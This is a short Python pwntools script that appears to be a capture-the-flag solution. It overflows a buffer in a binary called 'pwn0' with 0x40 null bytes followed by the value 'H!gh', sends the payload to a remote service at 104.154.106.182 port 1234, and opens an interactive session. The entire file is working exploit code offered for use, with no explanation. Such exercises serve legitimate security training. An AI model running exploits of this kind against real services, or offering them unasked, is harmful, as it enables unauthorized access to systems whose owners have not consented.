from pwn import *

junk = "\x00" * 0x40
payload = junk + "H!gh"
#Io = process("./pwn0")
Io = remote("104.154.106.182",1234)
Io.sendline(payload)
Io.interactive()
